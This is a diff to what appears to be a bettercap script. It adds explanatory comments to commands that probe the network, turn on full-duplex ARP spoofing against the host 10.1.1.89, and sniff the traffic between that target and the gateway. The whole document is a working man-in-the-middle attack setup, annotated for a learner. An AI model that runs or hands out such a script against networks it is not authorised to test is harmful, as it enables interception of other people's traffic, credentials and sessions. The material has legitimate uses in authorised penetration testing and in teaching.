@@ -1,6 +1,17 @@
-net.probe on 
+# Enable network probing to gather information about network devices.
+net.probe on
+
+# Set ARP spoofing to full-duplex mode, meaning both incoming and outgoing traffic between the target and the gateway will be intercepted.
 set arp.spoof.fullduplex true
+
+# Set the ARP spoofing target to a specific IP address (e.g., 10.1.1.89).
 set arp.spoof.targets 10.1.1.89
+
+# Enable ARP spoofing, which allows you to intercept traffic by impersonating devices on the network.
 arp.spoof on
+
+# Enable local sniffing, meaning traffic from the local machine will also be captured.
 set net.sniff.local true
+
+# Start sniffing network traffic, capturing packets passing through the network.
 net.sniff on
